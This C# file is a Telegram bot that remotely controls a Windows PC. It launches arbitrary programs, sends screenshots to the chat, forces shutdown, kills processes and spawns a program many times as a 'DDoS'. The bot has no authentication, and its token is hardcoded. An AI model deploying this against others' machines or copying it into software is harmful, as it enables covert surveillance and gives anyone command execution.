using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.ReplyMarkups;
using System.Drawing;

namespace tg_bot_controler
{
    internal class Program
    {



        //чаты ожидающие выполнения
        static string awaitingUrlChatId = null;
        static string awaitingPlaySoundChatId = null;
        static string awaitingSetWallpaperChatId = null;
        static string awaitingSetOutputDeviceChatId = null;
        static string awaitingDDoS1ChatId = null;
        static string awaitingDDoS2ChatId = null;
        static string awaitingKillProgrammChatId = null;
        static string awaitingSendMessageBoxChatId = null;

        static string mainmenu = "Выберите, что хотите сделать: " +
                     "\n /launch - открытие сайта или системного приложения " +
                     "\n /playsound - проигрывание звука " +
                     "\n /setwallpaper - установка обоев рабочего стола " +
                     "\n /makescreenshot - создание скриншота" +
                     "\n /shutdown - выключение компьютера" +
                     "\n /ddos - открытие большого кол-ва приложений" +
                     "\n /getactiveprogramms - выводит список активных программ" +
                     "\n /killprogramm - завершение работы программы" +
                     "\n /sendmessage - отправка окошка с сообщением(бот перестанет работать, пока пользователь не закроет окно с сообщением)";

        //кол-во запусков ддос
        static int DDoScount = 0;

        //путь к папке сохранения документов
        static string DocumentPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);


        //клавиатура
        static ReplyKeyboardMarkup replyKeyboardMarkup = new ReplyKeyboardMarkup(new[]
                    {
                        new KeyboardButton[] { "/launch", "/playsound"},
                        new KeyboardButton[] { "/makescreenshot", "/ddos" },
                    })
        {
            ResizeKeyboard = true
        };




        static void Main(string[] args)
        {
            var bot = new TelegramBotClient("7392660717:AAHqY-9JjNcsfoT6A6vsDokkoaR-C0K0KX0");
            Console.WriteLine("Bot Started");

            bot.StartReceiving(update, error);


            Console.ReadLine();
        }

        private static async Task update(ITelegramBotClient client, Update update, CancellationToken token)
        {
            var message = update.Message;
            var chatId = message.Chat.Id;
            if (message.Chat.Username != null)
            {
                Console.WriteLine(message.Chat.Username + ": " + message.Text);
            }
            else Console.WriteLine(message.Chat.Id + ": " + message.Text);

            //открытие URL
            if (awaitingUrlChatId != null && awaitingUrlChatId == chatId.ToString())
            {
                try
                {
                    if(CheckReturn(message.Text,chatId, client))
                    {
                        return;
                    }
                    Process.Start(message.Text);
                    Console.WriteLine("URL opened");
                    await client.SendTextMessageAsync(chatId, "✅приложение/сайт успешно открылся");
                    awaitingUrlChatId = null;
                    ReturnToHome(chatId,client);
                    return;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    await client.SendTextMessageAsync(chatId, "❌что-то пошло нет так. Для возврата напишите /return или попробуйте вставить URl заново");
                    return;
                }
            }

            //DDos part1
            if (awaitingDDoS1ChatId != null && awaitingDDoS1ChatId == chatId.ToString())
            {
                try
                {
                    if (CheckReturn(message.Text, chatId, client))
                    {
                        return;
                    }
                    client.SendTextMessageAsync(chatId, "напишите URL сайта или путь к системному приложению");
                    DDoScount = Convert.ToInt32(message.Text);
                    awaitingDDoS2ChatId = awaitingDDoS1ChatId;
                    awaitingDDoS1ChatId = null;
                    //ReturnToHome(chatId, client);
                    return;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    await client.SendTextMessageAsync(chatId, "❌что-то пошло нет так. Для возврата напишите /return или попробуйте заново");
                    return;
                }
            }
            
            //DDos part2
            if (awaitingDDoS2ChatId != null && awaitingDDoS2ChatId == chatId.ToString())
            {
                try
                {
                    if (CheckReturn(message.Text, chatId, client))
                    {
                        return;
                    }
                    client.SendTextMessageAsync(chatId, "✅DDoS атака успешно началась");
                    for(int i = 0; i < DDoScount; i++)
                    {
                        Process.Start(message.Text);
                    }
                    DDoScount = 0;
                    awaitingDDoS2ChatId = null;
                    ReturnToHome(chatId, client);
                    return;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    await client.SendTextMessageAsync(chatId, "❌что-то пошло нет так. Для возврата напишите /return или попробуйте заново");
                    return;
                }
            }

            //установка обоев на рабочем столе
            if (awaitingSetWallpaperChatId != null && awaitingSetWallpaperChatId == chatId.ToString())
            {
                try
                {
                    if (CheckReturn(message.Text, chatId, client))
                    {
                        return;
                    }
                    if(message.Photo != null)
                    {
                        await client.SendTextMessageAsync(chatId, "отправьте ввиде документа");
                        return;
                    }
                    if (message.Document != null)
                    {
                        string destinationFilePath = DocumentPath + message.Document.FileName; //путь вместе с названием файла
                        var fileId = message.Document.FileId;
                        Stream fileStream = System.IO.File.Create(destinationFilePath);
                        var file = await client.GetInfoAndDownloadFileAsync(fileId, fileStream);
                        fileStream.Close();


                        PhotoManager photoManager = new PhotoManager();
                        photoManager.SetWallpaper(destinationFilePath);

                        Console.WriteLine("wallpaper set, please reboot pc");
                        await client.SendTextMessageAsync(chatId, "✅обои успешно установлены, чтобы изменения вступили в силу, требуется перезагрузить компьютер");
                        awaitingSetWallpaperChatId = null;
                        ReturnToHome(chatId, client);
                        return;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    await client.SendTextMessageAsync(chatId, "❌что-то пошло нет так. Для возврата напишите /return или повторите попытку заново");
                    return;
                }
            }

            if(awaitingSendMessageBoxChatId != null && awaitingSendMessageBoxChatId == chatId.ToString())
            {
                try
                {
                    if (CheckReturn(message.Text, chatId, client))
                    {

                        return;
                    }
                    await client.SendTextMessageAsync(chatId, "✅ сообщение отправлено");
                    awaitingSendMessageBoxChatId = null;

                    MessageBox.Show(message.Text,"Message",MessageBoxButtons.OK,MessageBoxIcon.Error,MessageBoxDefaultButton.Button1,MessageBoxOptions.DefaultDesktopOnly);


                   /*NotifyIcon notifyIcon = new NotifyIcon();
                   notifyIcon.BalloonTipIcon = ToolTipIcon.Info;
                   notifyIcon.BalloonTipTitle = "message";
                   notifyIcon.BalloonTipText = message.Text;
                   notifyIcon.Visible = true;
                   notifyIcon.ShowBalloonTip(5);
*/
                   await client.SendTextMessageAsync(chatId, "✅ сообщение прочитано");
                    ReturnToHome(chatId, client);
                    return;
                }
                catch(Exception e)
                {
                    Console.WriteLine(e.Message);
                    await client.SendTextMessageAsync(chatId, "❌что-то пошло нет так. Для возврата напишите /return или повторите попытку заново");
                    return;
                }
            }

            //проигрывание звука
            if (awaitingPlaySoundChatId != null && awaitingPlaySoundChatId == chatId.ToString())
            {
                try
                {
                    try
                    {
                        if (CheckReturn(message.Text, chatId, client))
                        {
                            return;
                        }
                    }
                    finally { }
                    //воспроизведение звука
                    if (message.Audio != null)
                    {
                        string destinationFilePath = DocumentPath + message.Audio.FileName; //путь вместе с названием файла
                        var fileId = message.Audio.FileId;
                        Stream fileStream = System.IO.File.Create(destinationFilePath);
                        var file = await client.GetInfoAndDownloadFileAsync(fileId, fileStream);
                        fileStream.Close();


                        SoundPlayer soundPlayer = new SoundPlayer();
                        soundPlayer.PlaySound(destinationFilePath);

                        Console.WriteLine(fileId);
                        //Console.WriteLine(fileInfo);
                        //Console.WriteLine(filePath);
                        Console.WriteLine(destinationFilePath);

                        Console.WriteLine("Звук начал воспроизведение");
                        await client.SendTextMessageAsync(chatId, "✅Звук успешно начал воспроизведение");
                        
                        awaitingPlaySoundChatId = null;
                        ReturnToHome(chatId, client);
                        return;
                    }
                    else { await client.SendTextMessageAsync(chatId, "❌что-то пошло нет так. Для возврата напишите /return или попробуйте заново загрузить звук в формате mp3"); }

                    
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    await client.SendTextMessageAsync(chatId, "❌что-то пошло нет так. Для возврата напишите /return или попробуйте заново загрузить звук в формате mp3");

                }
                return;
            }

            if (awaitingSetOutputDeviceChatId != null && awaitingSetOutputDeviceChatId == chatId.ToString())
            {
                try
                {
                    if (CheckReturn(message.Text, chatId, client))
                    {
                        return;
                    }
                    Console.WriteLine("sada");
                    SoundPlayer soundPlayer = new SoundPlayer();
                    soundPlayer.SetOutputDevice();
                    awaitingSetOutputDeviceChatId = null;
                    return;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    await client.SendTextMessageAsync(chatId, "dfsfsfsdfsdfsdfsdfsdfsdsdfsdfsdfsdfsdfsdfsdfsdfdsfsdfsdfsd");
                    return;
                }
            }


            //проверка на возвращение в главное меню и само меню
            if (message.Text == "/start" || message.Text == "/return")
            {
                /*var replyKeyboardMarkup = new ReplyKeyboardMarkup(new[]
                    {
                        new KeyboardButton[] { "Open URL"},
                        new KeyboardButton[] { "Play sound" },
                    })
                {
                    ResizeKeyboard = true
                };*/
                await client.SendTextMessageAsync(chatId,mainmenu , replyMarkup: replyKeyboardMarkup);
            }

            if (awaitingKillProgrammChatId != null && awaitingKillProgrammChatId == chatId.ToString())
            {
                try
                {
                    if (CheckReturn(message.Text, chatId, client))
                    {
                        return;
                    }
                    WindowsControler.KillProgramm(Convert.ToInt32(message.Text));
                    client.SendTextMessageAsync(chatId, "✅приложение успешно закрылось");
                    awaitingKillProgrammChatId = null;
                    ReturnToHome(chatId,client);
                    return;
                }
                catch(Exception e)
                {
                    client.SendTextMessageAsync(chatId, "❌что-то пошло нет так, возможно Вы указали неправильный индекс числа . Для возврата напишите /return ");
                    Console.WriteLine(e.Message);
                    return;
                }
            }





                //проверка команд
                if (message.Text != null)
            {
                try
                {
                    if (message.Text == "/launch")
                    {
                        await client.SendTextMessageAsync(chatId, "напишите URL сайта или путь к приложению");
                        awaitingUrlChatId = chatId.ToString();
                        return;
                    }

                    if (message.Text == "/setwallpaper")
                    {
                        await client.SendTextMessageAsync(chatId, "отправьте фото ввиде документа");
                        awaitingSetWallpaperChatId = chatId.ToString();
                        return;
                    }

                    if (message.Text == "/playsound")
                    {
                        await client.SendTextMessageAsync(chatId, "отправьте звуковой файл в формате mp3");
                        awaitingPlaySoundChatId = chatId.ToString();
                        return;
                    }


                    if (message.Text == "gg")
                    {
                        awaitingSetOutputDeviceChatId = chatId.ToString();
                        return;
                    }

                    if (message.Text == "/ddos")
                    {
                        awaitingDDoS1ChatId = chatId.ToString();
                        await client.SendTextMessageAsync(chatId, "Напишите кол-во запусков");
                        return;
                    }

                    if (message.Text == "/shutdown")
                    {
                        Process.Start("shutdown", "/s /t 0 /f");
                        return;
                    }

                    if (message.Text == "/sendmessage")
                    {
                        //client.SendTextMessageAsync(chatId,"данная функция находится на этапе разработки");
                        awaitingSendMessageBoxChatId = chatId.ToString();
                        client.SendTextMessageAsync(chatId,"напишите сообщение");
                        //ReturnToHome(chatId,client);
                        return;
                    }

                    if (message.Text == "/killprogramm")
                    {
                        awaitingKillProgrammChatId = chatId.ToString();
                        client.SendTextMessageAsync(chatId,"Напишите индекс приложения, которое вы ходите закрыть из следующего списка");
                        client.SendTextMessageAsync(chatId, WindowsControler.GetActiveProgramms() );
                        return;
                    }

                    //отправка скриншота
                    if (message.Text == "/makescreenshot")
                    {
                        string screenpath = DocumentPath + @"\screen.png";
                        PhotoManager screenshot = new PhotoManager();
                        await screenshot.MakeScreenshot(screenpath);
                        Console.WriteLine("скрин сделан");

                        var stream = new FileStream(screenpath, FileMode.Open, FileAccess.Read);

                        await client.SendPhotoAsync(
                            chatId: chatId,
                            photo: new InputFileStream(stream, "Screenshot.jpg"),
                            caption: ""
                        );

                        System.IO.File.Delete(screenpath);
                        ReturnToHome(chatId, client);
                        return;
                    }

                    if (message.Text == "/getactiveprogramms")
                    {
                        Console.WriteLine(WindowsControler.GetActiveProgramms());
                        client.SendTextMessageAsync(chatId,WindowsControler.GetActiveProgramms());
                        ReturnToHome(chatId, client);
                        return;
                    }
                    return;
                }catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    return;
                }
            }
        }

        //проверка на возвращение в главное меню
        private static bool CheckReturn(string message, ChatId chatID, ITelegramBotClient client)
        {
            if (message == "/start" || message == "/return")
            {
                ReturnToHome(chatID, client);
                return true;
            }
            else return false;
        }

        private static async void ReturnToHome(ChatId chatID, ITelegramBotClient client)
        {
            /*var replyKeyboardMarkup = new ReplyKeyboardMarkup(new[]
                    {
                        new KeyboardButton[] { "Open URL"},
                        //new KeyboardButton[] { "Button 3", "Button 4" },
                    })
            {
                ResizeKeyboard = true
            };*/
            await client.SendTextMessageAsync(chatID, mainmenu, replyMarkup: replyKeyboardMarkup);
            awaitingPlaySoundChatId = null;
            awaitingUrlChatId = null;
            awaitingDDoS1ChatId = null;
            awaitingDDoS2ChatId = null;
            awaitingKillProgrammChatId = null;
            awaitingSetOutputDeviceChatId = null;
            awaitingSetWallpaperChatId = null;
            awaitingSendMessageBoxChatId = null;
        }

        private static Task error(ITelegramBotClient client, Exception exception, CancellationToken token)
        {
            throw new NotImplementedException();
        }

    }
}
